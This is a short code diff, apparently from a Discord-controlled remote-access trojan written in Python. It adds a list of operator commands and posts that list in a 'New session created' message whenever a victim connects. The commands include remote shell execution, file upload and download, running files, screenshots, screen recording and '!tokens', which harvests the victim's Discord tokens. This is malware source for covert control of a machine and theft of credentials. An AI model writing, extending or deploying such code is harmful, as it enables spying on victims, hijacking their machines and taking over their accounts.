@@ -8,6 +8,20 @@ TOKEN = os.getenv("TOKEN")
 API_URL = "https://discord.com/api"
 WS_URL = "wss://gateway.discord.gg"
 GUILD_ID = os.getenv("GUILD_ID")
+COMMANDS = [
+    "!help - Help command",
+    "!ping - Ping command",
+    "!cd - Change directory",
+    "!ls - List directory",
+    "!download - Download file",
+    "!upload - Upload file",
+    "!shell - Execute shell command",
+    "!run - Run an file",
+    "!exit - Exit the session",
+    "!screenshot - Take a screenshot",
+    "!record <seconds> - Record the screen",
+    "!tokens - Get all discord tokens"
+]
 
 async def on_message(ws, message):
     print(message)
@@ -24,7 +38,9 @@ async def send_message(session, channel_id):
     session.post(f"{API_URL}/channels/{channel_id}/messages", json={
         "embeds": [{
             "title": "New session created",
-            "description": "",
+            "description": "```{}```".format(
+                "\n".join(COMMANDS)
+            ),
             "color": 0xfafafa,
             "fields": [
                 {
